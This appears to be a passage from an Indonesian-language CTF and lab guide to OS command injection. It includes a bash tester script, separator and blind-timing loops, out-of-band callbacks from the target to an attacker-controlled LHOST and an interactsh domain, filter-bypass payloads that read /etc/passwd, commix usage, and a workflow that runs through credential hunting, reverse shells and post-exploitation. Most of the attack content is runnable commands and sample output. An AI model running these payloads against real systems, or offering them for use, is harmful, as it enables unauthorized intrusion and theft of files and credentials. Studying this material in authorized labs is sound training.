# Tidak kompatibel dengan macOS date atau BSD date
START_NS="$(date +%s%N)"
baseline="$(
    curl -o /dev/null \
        -sS \
        --max-time 15 \
        -G "$URL" \
        --data-urlencode "${PARAM}=127.0.0.1" \
        -w '%{time_total}'
)"

echo "[+] Baseline time: ${baseline}s"
echo

# ------------------------------------------------------------
# Temporary summary file
# ------------------------------------------------------------

SUMMARY_FILE="$(mktemp)"

cleanup() {
    rm -f "$SUMMARY_FILE"
}

trap cleanup EXIT

# ------------------------------------------------------------
# Test each separator
# ------------------------------------------------------------

while IFS= read -r separator || [[ -n "$separator" ]]; do

    # Skip empty lines.
    [[ -z "$separator" ]] && continue

    echo "------------------------------------------------------------"
    echo "[*] Testing separator: [$separator]"

    payload="127.0.0.1${separator}id"

    response="$(
        request_test "$payload" 2>/dev/null
    )"

    if [[ "$response" == *"uid="* ]]; then
        echo "[+] RESULT: SUCCESS"
        echo "[+] Detection: uid= found"

        printf '%s\tSUCCESS\tIN_BAND\n' "$separator" >> "$SUMMARY_FILE"
    else
        echo "[-] RESULT: NO uid= FOUND"

        printf '%s\tFAILED\tNO_UID\n' "$separator" >> "$SUMMARY_FILE"
    fi

done < "$SEPARATOR_FILE"

# ------------------------------------------------------------
# Blind timing test
# ------------------------------------------------------------

echo
echo "============================================================"
echo " Blind Timing Test"
echo "============================================================"

echo "[*] Testing sleep-based payload..."

START_NS="$(date +%s%N)"

curl -o /dev/null \
    -sS \
    --max-time 12 \
    -G "$URL" \
    --data-urlencode "${PARAM}=127.0.0.1;sleep 5"

END_NS="$(date +%s%N)"

ELAPSED_NS=$((END_NS - START_NS))
ELAPSED="$(awk "BEGIN { printf \"%.3f\", $ELAPSED_NS / 1000000000 }")"

echo "[+] Sleep test elapsed: ${ELAPSED}s"

# ------------------------------------------------------------
# Basic threshold indication
# ------------------------------------------------------------

TIMING_RESULT="NO_CLEAR_DELAY"

if awk "BEGIN {exit !($ELAPSED >= 4.0)}"; then
    TIMING_RESULT="POSSIBLE_BLIND_INJECTION"
    echo "[+] RESULT: POSSIBLE_BLIND_INJECTION"
    echo "[!] Verify with repeated baseline/timing measurements."
else
    echo "[-] RESULT: NO_CLEAR_DELAY"
fi

# ------------------------------------------------------------
# Summary
# ------------------------------------------------------------

echo
echo "============================================================"
echo " Summary"
echo "============================================================"

printf '%-12s %-10s %-15s\n' \
    "SEPARATOR" "STATUS" "MODE"

printf '%-12s %-10s %-15s\n' \
    "---------" "------" "----"

while IFS=$'\t' read -r sep status mode; do
    printf '%-12s %-10s %-15s\n' \
        "$sep" "$status" "$mode"
done < "$SUMMARY_FILE"

echo
echo "[*] Timing: ${TIMING_RESULT}"
echo
echo "[!] This tool only tests command execution indicators."
echo "[!] It does NOT launch reverse shells."
echo "[!] It does NOT establish persistence."
echo "[!] It does NOT automatically exfiltrate files."
echo "[!] Use only against authorized lab/CTF targets."
echo
```

---

## Membuat `separators.txt`

```bash
# Create the separator list:
cat > separators.txt <<'EOF'
;
&
&&
|
||
EOF
```

---

## Permission

```bash
# Make the script executable:
chmod +x cmdinjection_test.sh
```

---

## Jalankan

```bash
# Run against the authorized CTF endpoint:
./cmdinjection_test.sh \
  "http://10.10.10.50/ping" \
  "host" \
  separators.txt
```

---

## Contoh Output Realistis

```text
============================================================
 Command Injection Tester
============================================================
[!] AUTHORIZED LAB / CTF ONLY
[*] URL       : http://10.10.10.50/ping
[*] PARAMETER : host
[*] SEPARATORS: separators.txt

[*] Collecting baseline response time...
[+] Baseline time: 0.183s

------------------------------------------------------------
[*] Testing separator: [;]
[+] RESULT: SUCCESS
[+] Detection: uid= found

------------------------------------------------------------
[*] Testing separator: [&]
[-] RESULT: NO uid= FOUND

------------------------------------------------------------
[*] Testing separator: [&&]
[+] RESULT: SUCCESS
[+] Detection: uid= found

------------------------------------------------------------
[*] Testing separator: [|]
[+] RESULT: SUCCESS
[+] Detection: uid= found

------------------------------------------------------------
[*] Testing separator: [||]
[-] RESULT: NO uid= FOUND

============================================================
 Blind Timing Test
============================================================
[*] Testing sleep-based payload...
[+] Sleep test elapsed: 5.214s
[+] RESULT: POSSIBLE_BLIND_INJECTION
[!] Verify with repeated baseline/timing measurements.

============================================================
 Summary
============================================================

SEPARATOR    STATUS     MODE
---------    ------     ----
;            SUCCESS    IN_BAND
&            FAILED     NO_UID
&&           SUCCESS    IN_BAND
|            SUCCESS    IN_BAND
||           FAILED     NO_UID

[*] Timing: POSSIBLE_BLIND_INJECTION
```

### 📌 Kapan Digunakan

Gunakan script setelah:

```text
endpoint diketahui
parameter diketahui
```

dan Anda ingin memperoleh baseline separator secara cepat.

---

# 🌳 7 — Decision Tree Lengkap

```text
                         ┌────────────────────────┐
                         │ Suspicious Input Found │
                         └────────────┬───────────┘
                                      │
                                      ▼
                          ┌──────────────────────┐
                          │ Understand Feature   │
                          │ ping/nslookup/etc.   │
                          └──────────┬───────────┘
                                     │
                                     ▼
                          ┌──────────────────────┐
                          │ Test benign input    │
                          └──────────┬───────────┘
                                     │
                                     ▼
                     ┌──────────────────────────────┐
                     │ Test command separator       │
                     │ ; & && | || newline          │
                     └──────────────┬───────────────┘
                                    │
                  ┌─────────────────┴──────────────────┐
                  │                                    │
                  ▼                                    ▼
             ACCEPTED                              REJECTED
                  │                                    │
                  ▼                                    ▼
        ┌─────────────────┐                    ┌───────────────┐
        │ Test "id"       │                    │ Filter exists │
        └────────┬────────┘                    └───────┬───────┘
                 │                                     │
          ┌──────┴───────┐                   ┌─────────┴────────┐
          │              │                   │                  │
          ▼              ▼                   ▼                  ▼
      OUTPUT YES    OUTPUT NO             Bypass            Re-evaluate
          │              │                   │                input
          ▼              ▼                   │
      IN-BAND        BLIND                  │
          │              │                  │
          │              ▼                  │
          │      ┌───────────────┐          │
          │      │ sleep 5       │          │
          │      │ timing test   │          │
          │      └───────┬───────┘          │
          │              │                  │
          │       ┌──────┴──────┐           │
          │       │             │           │
          │       ▼             ▼           │
          │   DELAY YES     DELAY NO       │
          │       │             │           │
          │       ▼             ▼           │
          │    BLIND       Not confirmed    │
          │       │                         │
          │       ▼                         │
          │   OOB test                      │
          │       │                         │
          │       ▼                         │
          │   CALLBACK YES                  │
          │       │                         │
          │       ▼                         │
          │   OOB CONFIRMED                 │
          │                                 │
          └────────────────┬────────────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │ Target OS?      │
                  └────────┬────────┘
                           │
                    ┌──────┴──────┐
                    │             │
                    ▼             ▼
                  Linux        Windows
                    │             │
                    ▼             ▼
             bash/sh/dash     cmd/PowerShell
                    │             │
                    └──────┬──────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │ RCE confirmed   │
                  └────────┬────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │ Recon host      │
                  │ id/whoami/etc.  │
                  └────────┬────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │ File / secrets  │
                  │ enumeration     │
                  └────────┬────────┘
                           │
                           ▼
                  ┌─────────────────┐
                  │ Shell required? │
                  └────────┬────────┘
                           │
                           ▼
                  Reverse shell
                           │
                           ▼
                  Post-exploitation
```

---

# 🧯 8 — Common Errors & Troubleshooting

|Error|Sebab|Solusi|
|---|---|---|
|Command tidak execute tapi input accepted|Parameter mungkin hanya dipakai sebagai data|Cari feature/server behavior yang benar|
|Output tidak muncul|Blind command injection|Gunakan timing/OOB|
|`sleep` tidak terdeteksi|Response sudah lambat|Bandingkan baseline dan lakukan beberapa sampel|
|Special chars di-escape|Application encoding/sanitization|Inspect request/response dan cari parser discrepancy|
|WAF block|Signature detected|Uji encoding/token splitting di lab|
|Command terpotong|Parameter parser / length limit|Gunakan command lebih pendek|
|`Permission denied`|Web user tidak punya privilege|Enumerasi `id`, `groups`, `sudo -l`|
|Network callback tidak sampai|Egress firewall|Coba DNS OOB atau cek routing|
|`id` tidak menghasilkan output|Wrong shell/context|Coba `whoami`, `printf`, atau timing|
|`sleep: command not found`|Minimal shell/environment|Gunakan alternatif seperti `ping`|
|`ping` tidak ada|Minimal container|Cari utility lain|
|`$IFS` tidak bekerja|Variable expansion disabled|Coba tab atau shell-independent input|
|`;` diblok|Separator blacklist|Test `&&`, `|
|`&&` tidak bekerja|Shell/parser berbeda|Tentukan shell dahulu|
|`|` tidak bekerja|Input escaping|
|`||` tidak bekerja|
|Newline hilang|HTTP/application normalization|Test Burp raw request|
|Backticks gagal|Shell berbeda / escaping|Coba `$()`|
|`$()` gagal|Shell parser tidak mendukung|Enumerasi interpreter|
|`cmd` Windows gagal di Linux|Wrong OS assumptions|Detect OS terlebih dahulu|
|`ls` gagal di Windows|Wrong command family|Gunakan `dir`|
|`cat` gagal di Windows|Wrong command family|Gunakan `type`|
|Reverse shell connect timeout|Wrong LHOST|Gunakan interface VPN/lab|
|Reverse shell listener tidak menerima|Port/firewall salah|Verify listener dan routing|
|Python reverse shell gagal|Python tidak terinstall|Check `python3 --version`|
|Netcat `-e` gagal|OpenBSD netcat tanpa `-e`|Gunakan FIFO variant|
|PHP payload gagal|PHP binary tidak tersedia|Check `php -v`|
|Perl payload gagal|Perl tidak tersedia|Coba Python/Bash|
|OOB DNS berhasil tetapi HTTP gagal|Egress policy|Gunakan DNS OOB|
|OOB sama sekali tidak berhasil|Outbound traffic diblok|Kembali ke timing|
|Timing false positive|Network latency|Gunakan repeated baseline|
|HTTP request timeout|Endpoint long-running|Gunakan delay kecil dan baseline|
|Script tester error|Invalid URL/parameter|Periksa validation message|
|Script tidak menemukan `uid=`|Output format berbeda|Coba `whoami` / inspect response manually|
|Commix gagal tetapi manual berhasil|Filter/parameter complexity|Gunakan manual request reproduction|
|Commix tidak menemukan parameter|Request format kompleks|Berikan exact URL/data/cookie|
|RCE terbukti tetapi reverse shell gagal|Egress blocked|Gunakan OOB/data-channel alternatif|
|File read menghasilkan HTML|Output wrapped by application|Save response dan inspect|
|`/etc/passwd` tidak ditemukan|Windows/container/restricted FS|Detect OS/path|
|`sudo -l` meminta password|Sudo requires authentication|Continue non-sudo enumeration|
|`find /` sangat lambat|Filesystem besar|Limit path atau gunakan `head`|
|Output terlalu panjang|HTTP response limit|Gunakan `head`, `tail`, `grep`|
|Command hanya bekerja satu kali|Session/state behavior|Inspect application lifecycle|
|Parameter tidak benar-benar command|False positive|Uji `id`, `sleep`, dan OOB independently|

---

# 🏆 9 — Golden Rules

## Rule 1 — Jangan Menganggap Feature = Vulnerability

```text
ping feature
≠
command injection
```

Cari bukti bahwa input mencapai command interpreter.

---

## Rule 2 — Start dengan Canary

Selalu:

```text
id
whoami
```

sebelum:

```text
reverse shell
```

---

## Rule 3 — Bedakan Accepted vs Executed

```text
INPUT ACCEPTED
     ≠
COMMAND EXECUTED
```

---

## Rule 4 — Bedakan In-Band vs Blind

```text
Output terlihat
    → in-band

Output tidak terlihat
    → timing / OOB
```

---

## Rule 5 — Timing Harus Dibandingkan

Jangan:

```text
"5 detik = confirmed"
```

Gunakan:

```text
baseline
+
multiple samples
+
controlled delay
```

---

## Rule 6 — OOB Adalah Bukti, Bukan Tebakan

```text
DNS callback
    ↓
Target executed network command
```

Itu jauh lebih kuat dibanding response yang hanya "sedikit berbeda".

---

## Rule 7 — Jangan Langsung WAF Bypass

Pertama cari:

```text
apakah ada filter?
```

baru:

```text
apa yang diblok?
```

baru:

```text
bypass tepat terhadap behavior itu
```

---

## Rule 8 — Shell Matters

Payload:

```text
bash-specific
```

belum tentu bekerja pada:

```text
dash
sh
cmd
PowerShell
```

---

## Rule 9 — RCE ≠ Root

Jika:

```text
uid=33(www-data)
```

maka Anda mendapatkan:

```text
RCE as www-data
```

bukan:

```text
root
```

---

## Rule 10 — Enumerate Before Escalating

```text
RCE
 ↓
id
 ↓
sudo -l
 ↓
SUID
 ↓
processes
 ↓
credentials
 ↓
privilege escalation
```

---

## Rule 11 — Minimal Payload Beats Complex Payload

Gunakan:

```text
id
```

sebelum:

```text
100-character reverse shell
```

---

## Rule 12 — Encode at the Transport Layer

Gunakan:

```bash
# Let curl safely URL-encode complex payloads:
curl -G 'http://TARGET/test' \
  --data-urlencode 'param=PAYLOAD'
```

Daripada manual:

```text
PAYLOAD%20...
```

---

## Rule 13 — Don't Confuse Local Shell With Target Shell

Ketika menjalankan:

```bash
curl -G 'http://TARGET/test' --data-urlencode 'param=127.0.0.1;id'
```

`;` di dalam quoted string adalah data untuk target.

Tetapi jika Anda menulis:

```bash
curl URL?param=127.0.0.1;id
```

shell lokal dapat memproses `;id`.

---

## Rule 14 — Verify Every Chain

```text
separator works
      ↓
id works
      ↓
sleep works
      ↓
OOB works
      ↓
RCE confirmed
```

Jangan lompat beberapa tahap tanpa bukti.

---

## Rule 15 — Command Injection Adalah Primitive, Bukan Tujuan

Primitive:

```text
arbitrary OS command execution
```

Dari primitive tersebut Anda dapat melakukan:

```text
recon
file read
credential discovery
network enumeration
privilege escalation
shell
```

Tetapi setiap langkah harus mengikuti scope challenge.

---

# ✅ 10 — Final Checklist & Quick Reference

# Final Checklist

```text
[ ] Feature mencurigakan ditemukan
[ ] Parameter yang dikontrol user diketahui
[ ] Request asli dicapture
[ ] Baseline response dicatat
[ ] Baseline response time dicatat
[ ] Separator ; diuji
[ ] Separator & diuji
[ ] Separator && diuji
[ ] Separator | diuji
[ ] Separator || diuji
[ ] Newline diuji jika relevan
[ ] Backtick diuji jika relevan
[ ] $() diuji jika relevan
[ ] id diuji
[ ] whoami diuji
[ ] Output in-band diperiksa
[ ] Blind behavior diperiksa
[ ] sleep diuji
[ ] ping timing diuji jika relevan
[ ] Timing dibandingkan dengan baseline
[ ] OOB DNS diuji jika diperlukan
[ ] OOB HTTP diuji jika diperlukan
[ ] Filter/blacklist diidentifikasi
[ ] Space bypass diuji jika relevan
[ ] Special-character bypass diuji
[ ] Encoding diuji
[ ] Length restriction diuji
[ ] Target OS ditentukan
[ ] Shell ditentukan
[ ] RCE dikonfirmasi
[ ] Current user dicatat
[ ] Hostname dicatat
[ ] Kernel dicatat
[ ] Interface/network dicatat
[ ] Process enumeration dilakukan
[ ] Environment variables diperiksa
[ ] sudo -l diperiksa
[ ] SUID diperiksa
[ ] Interesting files dicari
[ ] Credentials/config dicari
[ ] Reverse shell hanya jika diperlukan
[ ] Persistence hanya jika challenge meminta
[ ] Findings dicatat
```

---

# ⚡ Quick Reference — 60 Second Workflow

```text
COMMAND INJECTION FOUND
          │
          ▼
     Identify parameter
          │
          ▼
      Baseline request
          │
          ▼
   Test separator quickly
          │
     ┌────┴────┐
     │         │
     ▼         ▼
  Works?    Blocked?
     │         │
     ▼         ▼
   Test id   Identify filter
     │         │
 ┌───┴───┐     ▼
 │       │   Bypass
 ▼       ▼     │
YES      NO    │
 │       │     │
 ▼       ▼     │
RCE?   sleep   │
 │       │     │
 ▼       ▼     │
In-band Timing │
 │       │     │
 │    ┌──┴───┐ │
 │    │      │ │
 │    ▼      ▼ │
 │  delay   no delay
 │    │         │
 │    ▼         │
 │   OOB        │
 │    │         │
 └────┴─────────┘
          │
          ▼
      Detect OS
      /       \
 Linux       Windows
   │             │
 bash/sh      cmd/PowerShell
   │             │
   └──────┬──────┘
          │
          ▼
    RCE CONFIRMED
          │
          ▼
      id/whoami
          │
          ▼
 hostname/uname
          │
          ▼
     ip a / ps
          │
          ▼
  env / sudo -l / SUID
          │
          ▼
 credentials / files
          │
          ▼
   reverse shell
          │
          ▼
 post-exploitation
```

---

# 🧠 Final Mental Model

Jangan menghafal ratusan payload.

Hafalkan **alur berpikir**:

```text
USER INPUT
    ↓
WHAT FEATURE?
    ↓
WHAT COMMAND?
    ↓
WHAT SHELL?
    ↓
CAN I BREAK COMMAND CONTEXT?
    ↓
OUTPUT VISIBLE?
   /      \
 YES      NO
  │        │
 id       sleep
  │        │
  │      timing
  │        │
  │       OOB
  │        │
  └────┬───┘
       ▼
   RCE CONFIRMED
       │
       ▼
   WHO AM I?
       │
       ▼
   WHERE AM I?
       │
       ▼
 WHAT CAN I READ?
       │
       ▼
 WHAT NETWORK DO I SEE?
       │
       ▼
 WHAT PRIVILEGES DO I HAVE?
       │
       ▼
 WHAT IS THE NEXT OBJECTIVE?
```

---

# 🔗 Cross-Workflow Mental Model

Command Injection sering menjadi **chain**, bukan vulnerability yang berdiri sendiri.

```text
File Upload
    │
    └──→ Upload Web Shell
                │
                ▼
        Command Execution
                │
                ▼
         Command Injection
                │
                ▼
         Internal Recon
                │
          ┌─────┴─────┐
          ▼           ▼
        LFI        SSRF
          │           │
          ▼           ▼
      File Read   Internal Service
          │           │
          └─────┬─────┘
                ▼
         Credential Leak
                │
                ▼
        Privilege Escalation
```

Workflow yang perlu otomatis terhubung di kepala:

```text
[File Upload]
      ↓
[Command Injection]
      ↓
[LFI/RFI]
      ↓
[SSRF]
      ↓
[SSTI]
      ↓
[SQL Injection]
      ↓
[IDOR / Access Control]
```

Setiap vulnerability memberikan **primitive berbeda**, dan skill CTF yang lebih tinggi berasal dari kemampuan mengenali kapan primitive tersebut dapat di-chain.

---

# 26 — Command Injection Complete Attack Workflow — Interactive Decision Guide

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export TARGET="10.10.11.200"
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"
export VULN_URL="http://$TARGET/ping"   # sesuaikan dengan endpoint
export VULN_PARAM="host"                # sesuaikan dengan parameter
mkdir -p ~/cmdi_loot/{output,shells,creds}
cd ~/cmdi_loot

echo "[*] Target: $TARGET | LHOST: $LHOST"
echo "[*] Vuln URL: $VULN_URL | Param: $VULN_PARAM"
```

**Output yang diharapkan:**

text

```
[*] Target: 10.10.11.200 | LHOST: 10.10.14.5
[*] Vuln URL: http://10.10.11.200/ping | Param: host
```

---

## ═══════════════════════════════════════

## FASE 0: RECONNAISSANCE & ATTACK SURFACE IDENTIFICATION

## ═══════════════════════════════════════

### Langkah 0.1 — Identifikasi Feature yang Mencurigakan

Bash

```
# Command 1: Fingerprint server & technology
curl -sI http://$TARGET/ | grep -iE "server|x-powered|content-type"
whatweb http://$TARGET/ 2>/dev/null

# Command 2: Cari fitur yang menggunakan OS command (ping, nslookup, dll)
curl -s http://$TARGET/ | grep -iE "ping|lookup|check|diagnos|convert|backup|scan|trace"

# Command 3: Enumerate halaman/endpoint yang tersedia
ffuf -u http://$TARGET/FUZZ \
     -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -mc 200,301,302,403 -fc 404 -t 50 -s 2>/dev/null | head -30

# Command 4: Cek semua form parameter di halaman
curl -s http://$TARGET/ | grep -iE 'input|textarea|select' | grep -iE 'name='
```

**OUTPUT BERHASIL ✅ — Menemukan feature mencurigakan:**

HTML

```
<form action="/ping" method="POST">
  <input type="text" name="host" placeholder="Enter IP/hostname">
  <button>Ping</button>
</form>
```

➡️ Feature `ping` → sangat mungkin menggunakan `system("ping -c 4 " . $host)`  
➡️ Catat: `export VULN_URL="http://$TARGET/ping"`, `export VULN_PARAM="host"`  
➡️ Lanjut ke **Langkah 0.2**

**Daftar attack surface yang perlu diperiksa:**

|Feature|Binary yang Mungkin Digunakan|Parameter Target|
|---|---|---|
|Ping tool|`ping`|`host`, `ip`, `target`|
|NSLookup/DNS|`nslookup`, `dig`|`domain`, `host`|
|Whois|`whois`|`domain`|
|Traceroute|`traceroute`|`host`|
|Image convert|`convert` (ImageMagick)|`file`, `filename`|
|PDF export|`wkhtmltopdf`|`url`, `page`|
|Email kirim|`mail`, `sendmail`|`to`, `subject`|
|Backup/zip|`tar`, `zip`|`path`, `filename`|
|Network check|`curl`, `wget`, `nc`|`url`, `host`|

---

### Langkah 0.2 — Baseline Request (WAJIB)

Bash

```
# SELALU ukur baseline dulu sebelum test apapun

# Command 1: Baseline normal response
curl -s -w "\nHTTP: %{http_code} | Time: %{time_total}s\n" \
     -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1" | tee ~/cmdi_loot/output/baseline.txt

# Command 2: Baseline dengan input tidak valid (untuk perbandingan error)
curl -s -w "\nHTTP: %{http_code} | Time: %{time_total}s\n" \
     -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=INVALID_HOST_XYZ123" | tee ~/cmdi_loot/output/baseline_invalid.txt

# Command 3: Ukur timing baseline 3x
for i in 1 2 3; do
    curl -o /dev/null -s \
         -w "Baseline run $i: %{time_total}s\n" \
         -G "$VULN_URL" \
         --data-urlencode "${VULN_PARAM}=127.0.0.1"
done
```

**OUTPUT BERHASIL ✅ — Baseline normal:**

text

```
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.021 ms

HTTP: 200 | Time: 0.18s
Baseline run 1: 0.183s
Baseline run 2: 0.179s
Baseline run 3: 0.185s
```

➡️ **Catat:** Baseline ~0.18s, response mengandung output `ping`  
➡️ Ini **in-band injection potential** → output command terlihat di response

**OUTPUT BERHASIL ✅ — Error saat input invalid:**

text

```
ping: INVALID_HOST_XYZ123: Name or service not known
HTTP: 200 | Time: 0.09s
```

➡️ **PENTING!** Error dari `ping` langsung muncul → **command benar-benar dijalankan**  
➡️ Response berbeda berdasarkan input = **strong indicator** command injection  
➡️ Lanjut ke **Fase 1**

**OUTPUT GAGAL ❌ — Response identik untuk semua input:**

text

```
{"status":"ok","message":"Host checked"}
HTTP: 200 | Time: 0.05s
```

➡️ Kemungkinan output tidak ditampilkan (blind) ATAU tidak vulnerable  
➡️ Lanjut ke Fase 1 dengan fokus blind detection

---

## ═══════════════════════════════════════

## FASE 1: SEPARATOR TESTING — PROBE INJECTION POINT

## ═══════════════════════════════════════

> **Tujuan:** Cari separator yang berhasil memisahkan command kita dari command aplikasi. Test SEMUA sebelum menyerah.

### Langkah 1.1 — Quick Separator Test (Semua Sekaligus)

Bash

```
# Test semua separator dalam satu loop - lihat mana yang return uid=
echo "=== SEPARATOR TEST STARTING ==="
for sep in ';' ' & ' ' && ' ' | ' ' || ' '%0a' '`'; do
    RESPONSE=$(curl -sG "$VULN_URL" \
        --data-urlencode "${VULN_PARAM}=127.0.0.1${sep}id" \
        --max-time 10 2>/dev/null)
    
    if echo "$RESPONSE" | grep -q "uid="; then
        echo "[✅ VULNERABLE] Separator: [$sep] → uid FOUND!"
        echo "$RESPONSE" | grep -o "uid=[0-9]*([a-z-]*)" | head -3
    else
        echo "[❌] Separator: [$sep] → no uid"
    fi
done
echo "=== SEPARATOR TEST DONE ==="
```

**OUTPUT BERHASIL ✅ — Ada separator yang berhasil:**

text

```
=== SEPARATOR TEST STARTING ===
[❌] Separator: [;] → no uid
[✅ VULNERABLE] Separator: [ & ] → uid FOUND!
uid=33(www-data)
[✅ VULNERABLE] Separator: [ && ] → uid FOUND!
uid=33(www-data)
[✅ VULNERABLE] Separator: [ | ] → uid FOUND!
uid=33(www-data)
[❌] Separator: [ || ] → no uid
[❌] Separator: [%0a] → no uid
=== SEPARATOR TEST DONE ===
```

➡️ **IN-BAND INJECTION CONFIRMED!**  
➡️ Catat working separators: `&`, `&&`, `|`  
➡️ Lanjut ke **Fase 2 — Command Execution Confirmation**

**OUTPUT GAGAL ❌ — Tidak ada separator yang return uid:**

text

```
=== SEPARATOR TEST STARTING ===
[❌] Separator: [;] → no uid
[❌] Separator: [ & ] → no uid
[❌] Separator: [ && ] → no uid
[❌] Separator: [ | ] → no uid
[❌] Separator: [ || ] → no uid
[❌] Separator: [%0a] → no uid
=== SEPARATOR TEST DONE ===
```

➡️ Kemungkinan **blind injection** ATAU ada filter  
➡️ Lanjut ke **Langkah 1.2 — Blind Timing Test**

---

### Langkah 1.2 — Blind Timing Detection (Jika Fase 1.1 Gagal)

Bash

```
# Ukur baseline dulu
BASELINE=$(curl -o /dev/null -s \
    -w "%{time_total}" \
    -G "$VULN_URL" \
    --data-urlencode "${VULN_PARAM}=127.0.0.1")
echo "Baseline: ${BASELINE}s"

# Test sleep dengan berbagai separator
for sep in ';' ' & ' ' && ' ' | ' '%0a'; do
    START=$(date +%s%N)
    curl -o /dev/null -s --max-time 12 \
         -G "$VULN_URL" \
         --data-urlencode "${VULN_PARAM}=127.0.0.1${sep}sleep 5"
    END=$(date +%s%N)
    ELAPSED=$(awk "BEGIN {printf \"%.2f\", ($END - $START)/1000000000}")
    
    if awk "BEGIN {exit !($ELAPSED >= 4.0)}"; then
        echo "[✅ BLIND INJECTION] Separator: [$sep] | Elapsed: ${ELAPSED}s (baseline: ${BASELINE}s)"
    else
        echo "[-] Separator: [$sep] | Elapsed: ${ELAPSED}s"
    fi
done
```

**OUTPUT BERHASIL ✅ — Timing delay terdeteksi:**

text

```
Baseline: 0.18s
[✅ BLIND INJECTION] Separator: [;] | Elapsed: 5.21s (baseline: 0.18s)
[-] Separator: [ & ] | Elapsed: 0.19s
[-] Separator: [ && ] | Elapsed: 0.19s
[✅ BLIND INJECTION] Separator: [%0a] | Elapsed: 5.18s (baseline: 0.18s)
```

➡️ **BLIND COMMAND INJECTION CONFIRMED!**  
➡️ Working separators: `;` dan newline (`%0a`)  
➡️ Output tidak terlihat → ke **Langkah 1.3 — OOB Detection**

**OUTPUT GAGAL ❌ — Semua timing normal:**

text

```
Baseline: 0.18s
[-] Separator: [;] | Elapsed: 0.19s
[-] Separator: [ & ] | Elapsed: 0.18s
...
```

➡️ Kemungkinan ada **filter/WAF** yang blokir separator  
➡️ Coba **Langkah 1.4 — Filter Bypass**

---

### Langkah 1.3 — OOB Detection (Untuk Blind Injection)

Bash

```
# Setup interactsh untuk OOB detection
# Install jika belum ada
which interactsh-client || go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest 2>/dev/null

# Terminal 1: Jalankan interactsh
interactsh-client &
# Catat domain yang diberikan, contoh: abc123xyz.interactsh.com
export OOB_DOMAIN="abc123xyz.interactsh.com"

# Test OOB via DNS (paling reliable)
curl -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; nslookup $OOB_DOMAIN" \
     -s -o /dev/null

# Alternative: via curl/wget (HTTP OOB)
# Setup listener di terminal lain dulu
python3 -m http.server 8000 &
curl -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; curl http://$LHOST:8000/cmdi-test" \
     -s -o /dev/null

# Atau via ping ke attacker (butuh tcpdump untuk listen)
sudo tcpdump -i tun0 icmp -n &
curl -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; ping -c 1 $LHOST" \
     -s -o /dev/null
```

**OUTPUT BERHASIL ✅ — OOB callback diterima:**

text

```
# Di interactsh terminal:
DNS abc123xyz.interactsh.com
Interaction received from 10.10.11.200 at 2024-01-15 10:30:45

# Atau di http.server:
10.10.11.200 - - [15/Jan/2024 10:30:45] "GET /cmdi-test HTTP/1.1" 200 -

# Atau di tcpdump:
10:30:45.123456 IP 10.10.11.200 > 10.10.14.5: ICMP echo request
```

➡️ **BLIND INJECTION CONFIRMED VIA OOB!**  
➡️ Command execution terbukti meskipun output tidak terlihat di response  
➡️ Lanjut ke **Fase 2 — Information Gathering via OOB**

---

### Langkah 1.4 — Filter/WAF Bypass (Jika Semua Test Gagal)

Bash

```
# Cek indikator filter/WAF
# Response 400/403 atau "invalid input" = filter terdeteksi
curl -i -G "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; id" | grep -iE "HTTP/|blocked|invalid|error|waf"

# Test bypass techniques:

# Bypass 1: Space bypass dengan ${IFS}
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1;cat\${IFS}/etc/passwd" | grep "root:"

# Bypass 2: Newline separator URL encoded
curl -sG "$VULN_URL" \
     --data-urlencode $"${VULN_PARAM}=127.0.0.1\nid"

# Bypass 3: Command substitution
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1\$(id)"

# Bypass 4: Backtick substitution
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1\`id\`"

# Bypass 5: Quote bypass untuk keyword blacklist
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; c'a't /etc/passwd"

# Bypass 6: Hex encoding command
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; \$(printf '\151\144')"

# Bypass 7: Variable concatenation
curl -sG "$VULN_URL" \
     --data-urlencode "${VULN_PARAM}=127.0.0.1; a=i;b=d;\$a\$b"
```

**OUTPUT BERHASIL ✅ — Bypass berhasil:**

text

```
# Salah satu bypass return output uid=
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ Catat bypass technique yang berhasil  
➡️ Lanjut ke **Fase 2**

**OUTPUT GAGAL ❌ — Semua bypass gagal:**

text

```
(tidak ada uid= di output)
```

➡️ Filter sangat ketat. Coba:

Bash

```
# Gunakan Commix untuk automated bypass testing
commix -u "$VULN_URL" --data="${VULN_PARAM}=127.0.0.1" --level=3
# atau
python3 commix.py -u "$VULN_URL?${VULN_PARAM}=127.0.0.1" --technique=all
```

➡️ Google: `site:github.com command injection bypass [aplikasi/framework yang terdeteksi]`  
➡️ Google: `"[error message yang muncul]" command injection bypass`

---

## ═══════════════════════════════════════

## FASE 2: COMMAND EXECUTION CONFIRMATION & INFO GATHERING

## ═══════════════════════════════════════

> **ATURAN EMAS:** Jangan langsung reverse shell. Kumpulkan informasi dulu. `id` sebelum reverse shell!

### Langkah 2.1 — Identity & System Fingerprint

Bash

```
# Gunakan separator yang sudah terbukti (ganti SEP sesuai hasil Fase 1)
